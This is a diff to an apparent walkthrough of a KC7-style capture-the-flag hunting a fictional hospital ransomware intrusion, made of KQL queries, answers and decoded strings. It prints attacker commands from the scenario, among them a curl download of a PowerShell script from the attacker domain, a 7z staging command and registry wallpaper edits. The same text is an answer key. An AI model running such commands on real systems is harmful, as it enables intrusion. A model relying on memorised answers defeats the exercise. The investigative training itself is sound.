@@ -209,6 +209,9 @@ Answer: 7
 How many distinct links did the threat actors use in this batch of emails?
 This one should work if we change "distinct recipient" to "distinct link"
 Answer: 17
+For the record, those are: unhealthyrecordsystems.tech, medequipamateurs.org, takeyatimecarepartners.com, pharmasecondbest.net 
+Those resolve to the IPs of: 62.121.133.43, 25.126.98.121, 16.101.245.182, 215.95.144.58, 131.92.62.82, 115.12.60.150, 131.190.102.173, 93.142.203.80, 135.103.59.74, 96.120.124.180
+
 
 How many distinct domains were used in this batch of emails?
 I'd just eyeball this one: 4
@@ -314,7 +317,185 @@ InboundNetworkEvents
 | where src_ip in (ips)
 This makes a variable called ips, and in that variable, we put the  distinct source IPs from InboundNetworkEvents where the IP "search"ed the "azure"crest site. Then, we take those IPs, and just filter on those in the InboundNetworkEvents in general.
 This only gives 31, though, and the answer is 32. I'm assuming the last one is because they went to the site itself first.
+Edit: Later, I went back to S3Q3 and got IPs for the domains, and then queried:
+InboundNetworkEvents
+| where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
+And got 32 :)
 
 What article did they read about personnel changes at the hospital? (provide full url)
+Since the blurb before the question tells us that this is to save money, I tried:
+InboundNetworkEvents
+| where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
+| where url contains "money"
+Answer: https://azurecresthospital.med/news/roy-trenemman-joins-azure-crest-to-save-money-on-erp-systems
+(HOWEVER - this answer is not working on the site currently.)
+
+Which employee was hired as part of an effort to reduce costs?
+Roy Trenneman
+
+What article did Azure Crest publish about building one's own stuff instead of paying for it? (provide the full url)
 [In progress]
 
+While conducting reconnaissance, the threat actor also tried to get information about the juicy targets they were after. What specific type of medical records was the Threat Actor attempting to access on Azure Crest Hospital’s internal share?
+InboundNetworkEvents
+| where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
+| where url contains "record"
+Answer: pediatric
+
+Which employee did the threat actor ultimately decide to target?
+Using the query of just:
+InboundNetworkEvents
+| where src_ip has_any ("62.121.133.43", "25.126.98.121", "16.101.245.182", "215.95.144.58", "131.92.62.82", "115.12.60.150", "131.190.102.173", "93.142.203.80", "135.103.59.74", "96.120.124.180")
+We see Penny Pincher and Roy Trenneman were searched. Answer is Roy Trenneman.
+
+What is that employee's role?
+Employees
+| where name == "Roy Trenneman"
+Answer: Database Administrator
+For reference: hostname - SUPER-DB-SERVER-9000, username - rotrenneman, email - roy_trenneman@azurecresthospital.med, IP - 10.10.0.2
+
+What is the timestamp of the email that the threat actor sent to that employee?
+Well, we aren't sure what's going on with the spelling of Roy's name right now, so let's try:
+Email
+| where reply_to == "healthupdate@gmail.com" //Remember this from earlier
+| where recipient contains "roy"
+Answer: 2024-03-04T10:52:18.000Z
+
+Did that employee click on the link? (yes/no)
+Let's try:
+OutboundNetworkEvents
+| where url == "http://unhealthyrecordsystems.tech/images/images/New_Healthcare_Protocols.docm" //The link from the email
+| where src_ip == "10.10.0.2" //Roy's IP
+Answer: yes :(
+
+What is the timestamp for when the docm file was created on Roy's machine?
+Try:
+FileCreationEvents
+| where filename contains "docm"
+| where hostname == "SUPER-DB-SERVER-9000" //His hostname
+Answer: 2024-03-04T11:28:57.000Z
+
+What is the name of the first malicious file created by the threat actor in the user's Temp folder?
+Let's take that timestamp and look for files in Temp after that date and time:
+FileCreationEvents
+| where timestamp > datetime(2024-03-04T11:28:57.000Z)
+| where path contains "Temp"
+| where hostname == "SUPER-DB-SERVER-9000"
+Answer: dbhunter.exe
+
+What types of files does dbhunter.exe search for upon execution? (enter any one of them)
+Let's check ProcessEvents for that one:
+ProcessEvents
+| where timestamp > datetime(2024-04-01T15:13:25.000Z) //Timestamp of dbhunter.exe being created
+| where hostname == "SUPER-DB-SERVER-9000"
+And we get: dbhunter.exe --search --filetype .db .sql .mdb --output C:\\In\\found_databases.txt
+Possible answers: .db, .sql, .mdb
+
+What password is used to encrypt the compressed file containing Roy's meme collection?
+Let's add in this line:
+| where process_commandline contains "meme"
+And we see: 7z.exe a -t7z C:\\Out\\Roys_Meme_Collection.7z C:\\Out\\*meme*.mdb -p mommawemadeit
+Answer: mommawemadeit
+
+The execution of UrTottalyPwned.bat triggers the encryption of database files. What extension has been added to the files to indicate that they have been encrypted?
+First, let's do this to get a timestamp of that bat being run:
+ProcessEvents
+| where timestamp > datetime(2024-04-01T15:13:25.000Z)
+| where hostname == "SUPER-DB-SERVER-9000"
+| where process_commandline contains "UrTottalyPwned.bat"
+Timestamp: 2024-04-02T11:31:47.000Z
+Then, let's look for file creations after that particular timestamp:
+FileCreationEvents
+| where timestamp > datetime(2024-04-02T11:31:47.000Z)
+| where hostname == "SUPER-DB-SERVER-9000"
+Answer: .scholopendra
+
+A command was executed to modify registry settings, altering the desktop wallpaper for all user profiles. This change indicates that the files throughout the database had been encrypted by the threat actor. What is the name of the new wallpaper?
+Let's try this out:
+ProcessEvents
+| where timestamp > datetime(2024-04-02T11:31:47.000Z)
+| where hostname == "SUPER-DB-SERVER-9000"
+| where process_commandline contains "wallpaper"
+We see this command:
+cmd.exe /c reg add 'HKCU\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f && reg add 'HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System' /v Wallpaper /t REG_SZ /d 'C:\Users\Public\ItWentWrong.jpg' /f
+So the answer is: ItWentWrong.jpg
+
+
+Section 5: Mo' Money Mo' Problems
+Enter the MITRE ATT&CK ID corresponding to this technique. Adversaries use this Execution technique to execute arbitrary code in cloud environments.
+Basic OSI again: T1648
+
+Enter the MITRE ATT&CK ID corresponding to this technique. In this technique, adversaries execute their own malicious payloads by manipulating the way the operating system runs programs.
+T1574
+
+This cybersecurity personality likes to impose cost on adversaries. What's his username on X/Twitter?
+It's literally just ImposeCost
+
+What is the name of the malware used by North Korean cyber actors in an attack against the Kudankulam Nuclear Power Plant in India?
+Page 6 here - https://www.vifindia.org/sites/default/files/cyber-attack-on-kudankulam-nuclear-power-plant.pdf
+Answer: Dtrack
+
+Which encryption algorithm is commonly used for securing web traffic, especially in HTTPS connections?
+More OSI: TLS
+
+What is the CVE ID for the RCE vulnerability that was disclosed in the PaperCut application in early 2023?
+[My answer isn't working, so I'll come back]
+
+In this kind of attack, an adversary floods a network or server with excessive traffic to disrupt its normal operation. What is it called?
+Denial of service
+
+In July 2022, hackers affiliated with which nation conducted a destructive cyber attack against government organizations in Albania?
+Here - https://cyberlaw.ccdcoe.org/wiki/Homeland_Justice_operations_against_Albania_(2022)
+Answer: Iran
+
+What name did Mandiant give to the wiper malware used in the attacks against Albania?
+Zeroclear
+
+What is the name of the endpoint security solution that continuously monitors end-user devices to detect and respond to malicious threats?
+Endpoint detection and response
+
+What is the name of the process through which cyber defenders identify the party responsible for a cyber attack?
+Attribution
+
+Who is the host of the SANS threat analysis rundown (STAR) podcast?
+https://www.sans.edu/profiles/katie-nickels
+Answer: Katie Nickels
+
+When did Microsoft publish the Expert Profile on Simeon Kakpovi?
+[Again, what I found isn't working. Will return.]
+
+The "KC" in KC7 is a reference to this common cybersecurity framework that describes the steps an adversary must go through to be successful.
+Kill Chain
+
+aHR0cHM6Ly9henVyZWNyZXN0aG9zcGl0YWwubWVkL25ld3MvcmVzZWFyY2gvcm95LXRyZW5lbW1vbi1pbnZlbnRzLW5ldy1hcmNoaXRlY3R1cmUtZGF0YWJhc2Utc3lzdGVtcw==
+Simple decoding - https://azurecresthospital.med/news/research/roy-trenemmon-invents-new-architecture-database-systems
+
+YWVkaS1kb29nLWEtc2ktc21ldHN5cy1wcmUtbndvLXJ1b3ktZ25pbm51ci15aHcvaGNyYWVzZXIvc3dlbi9kZW0ubGF0aXBzb2h0c2VyY2VydXphLy86c3B0dGg=
+This one becomes - aedi-doog-a-si-smetsys-pre-nwo-ruoy-gninnur-yhw/hcraeser/swen/dem.latipsohtserceruza//:sptth
+Reversed - https://azurecresthospital.med/news/research/why-running-your-own-erp-systems-is-a-good-idea
+
+YWpiLWVoYmwtYWhlLWFucC1oYmwtYXJ1ai1menJnZmxmLWNlci1yaXZmYXJja3ItZWJzLWxuYy1sdWovdXBlbnJmcmUvZmpyYS9xcnoueW5ndmNmYnVnZnJlcHJlaG1uLy86ZmNnZ3U=
+This becomes - ajb-ehbl-ahe-anp-hbl-aruj-fzrgflf-cer-rivfarckr-ebs-lnc-luj/upenrfre/fjra/qrz.yngvcfbugfreprehmn//:fcggu
+Reversed - uggcf://nmherperfgubfcvgny.zrq/arjf/erfrnepu/jul-cnl-sbe-rkcrafvir-rec-flfgrzf-jura-lbh-pna-eha-lbhe-bja
+ROT13 - https://azurecresthospital.med/news/research/why-pay-for-expensive-erp-systems-when-you-can-run-your-own
+
+cmFicS1mdi1ndi1sbmotcnVnLXRhdm12YWJ2Z2h5YmlyZS1mdi1nZnJlcC1yZWhtbi1qYnUvdXBlbnJmcmUvZmpyYS9xcnoueW5ndmNmYnVnZnJlcHJlaG1uLy9dOltmY2trdQ==
+Becomes - rabq-fv-gv-lnj-rug-tavmvabvghybire-fv-gfrep-rehmn-jbu/upenrfre/fjra/qrz.yngvcfbugfreprehmn//]:[fckku
+Reversed - ukkcf[:]//nmherperfgubfcvgny.zrq/arjf/erfrnepu/ubj-nmher-perfg-vf-eribyhgvbavmvat-gur-jnl-vg-vf-qbar
+ROT13 - hxxps[:]//azurecresthospital.med/news/research/how-azure-crest-is-revolutionizing-the-way-it-is-done
+(Just change the X to T and remove [])
+
+Z3p5dnEteWctb2JsZXV1eXgtamJzeWstdG1mcS1pdGVid3UtenktdWFpdHVvdS14dmktenF5LXZzeW8tenN2L2Zrdm1pdWl2L3VxaXovamlhLmJtdGV4dXlmdHVpdmtpdnNubS8vOnV4dHRm
+Becomes - gzyvq-yg-obleuuyx-jbsyk-tmfq-itebwu-zy-uaituou-xvi-zqy-vsyo-zsv/fkvmiuiv/uqiz/jia.bmtexuyftuivkivsnm//:uxttf
+Reverse - fttxu://mnsvikviutfyuxetmb.aij/ziqu/viuimvkf/vsz-oysv-yqz-ivx-uoutiau-yz-uwbeti-qfmt-kysbj-xyuuelbo-gy-qvyzg
+Affine - https://azurecresthospital.med/news/research/run-your-own-erp-systems-on-sqlite-what-could-possibly-go-wrong
+
+H4sIAHySBGYA/23MscoCMRAE4FfJCxixtdXC0j4uP2tuMT9essfuBMzbnxxX2gzMDHy52xzlI+Gg4XJOKT2I6G76Mq5XBu/LTdjw7Nb2zm1M4u8/7tDK+NcWFz+FAiz+VY5EW/RWhGeUYZLVJh8OqR4huWz/b2YFYGJUDpQAAAA=
+From Base64 and then gunzip - curl.exe -o C:[[[\]]]ProgramData[[[\]]]Heartburn[[[\]]]anydesk_automation.ps1 https:[[/]][[/]]unhealthyrecordsystems.tech[[/]]anydesk_automation.ps1
+Remove the excess []
+curl.exe -o C:\ProgramData\Heartburn\anydesk_automation.ps1 https://unhealthyrecordsystems.tech/anydesk_automation.ps1
+
+bmVxYXJjYnlidXBmLm9xLmZydmViZ2FyaWF2X3lucHZxcnpyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycnJienJycmF2dnZ6cnJydnZhcnJyenJycnZ2YXJycnJycmZub25nblFyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycnJienJycmF2dnZ6cnJydnZhcnJyenJycnZ2YXJycnJyenJnZmxGcmJ6cnJyYXZ2dnpycnJ2dmFycnJ6cnJydnZhcnJycnJyYnpycnJhdnZ2enJycnZ2YXJycnpycnJ2dmFycnJycjpQ
+From Base64, then reverse, then ROT13 - C:eeeeeniieeemeeeniieeemiiineeemoeeeeeeniieeemeeeniieeemiiineeemoeSystemeeeeeniieeemeeeniieeemiiineeemoeeeeeeniieeemeeeniieeemiiineeemoeDatabaseeeeeeniieeemeeeniieeemiiineeemoeeeeeeniieeemeeeniieeemiiineeemoemedical_inventories.db.scholopendra
+A;; pf the eeniemeenies are \
+C:\System\Database\medical_inventories.db.scholopendra
